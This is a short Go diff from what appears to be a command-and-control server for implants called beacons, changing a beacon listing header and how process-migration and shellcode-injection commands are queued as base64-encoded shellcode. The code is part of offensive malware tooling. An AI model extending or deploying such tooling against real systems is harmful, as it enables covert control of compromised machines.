@@ -105,7 +105,7 @@ func convertTime(t time.Duration) (string) {
 }
 
 func listBeacons() {
-	header := "#\tID\t\t\tUser\t\tIP\t\t\t\t\tProcess\t\tPlatform\tArch\tLast Seen\n" +
+	header := "#\tID\t\tUser\t\tIP\t\tProcess\t\tPlatform\tArch\tLast Seen\n" +
 				   "---------------------------------------------------------------------------------------------------------"
 	formatString := "%d\t%-12s\t%-15s\t%-15s\t%-15s\t%-8s\t%-5s\t%-15s\n"
 	
@@ -313,8 +313,7 @@ func migrateBeacon(cmd []string) {
     content, _ := ioutil.ReadAll(reader)
     encoded := base64.StdEncoding.EncodeToString(content)
 	activeBeacon.ShellcodeBuffer = append(activeBeacon.ShellcodeBuffer, encoded)
-	activeBeacon.ShellcodeBuffer = append(activeBeacon.ShellcodeBuffer, cmd[1])
-	activeBeacon.ExecBuffer = append(activeBeacon.ExecBuffer, "migrate")
+	activeBeacon.ShellcodeBuffer = append(activeBeacon.ShellcodeBuffer, "migrate " + cmd[1])
 }
 
 func injectShellcode(cmd []string) {
@@ -334,7 +333,7 @@ func injectShellcode(cmd []string) {
     content, _ := ioutil.ReadAll(reader)
     encoded := base64.StdEncoding.EncodeToString(content)
 	activeBeacon.ShellcodeBuffer = append(activeBeacon.ShellcodeBuffer, encoded)
-	activeBeacon.ShellcodeBuffer = append(activeBeacon.ShellcodeBuffer, cmd[2])
+	activeBeacon.ShellcodeBuffer = append(activeBeacon.ShellcodeBuffer, "local " + cmd[2])
 }
 
 func notifyBeaconOfProxyUpdate(proxy *Beacon, targetId string) {
